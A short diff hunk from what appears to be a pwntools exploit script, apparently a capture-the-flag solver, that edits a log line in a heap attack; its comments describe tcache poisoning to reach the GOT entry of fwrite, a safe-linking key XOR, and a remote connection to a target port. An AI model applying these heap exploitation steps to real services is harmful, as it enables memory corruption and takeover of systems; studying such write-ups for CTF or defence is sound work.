@@ -157,7 +157,7 @@ def main():
     # tcache poison to get an address to the GOT entry of some function
     ## (using fwrite here, but any function where the controllable buffer ends
     ## up in the first argument will work)
-    r.info(f"tcache poison {exe.got['fwrite']-0x10=:x} ({exe.got['fwrite']^heap_key:x})")
+    r.info(f"tcache poison {exe.got['fwrite']=:x} ({exe.got['fwrite']^heap_key:x})")
     fds[1] = remote(HOST, poll_port)
     sleep(1)
     # explaination for this payload is further below
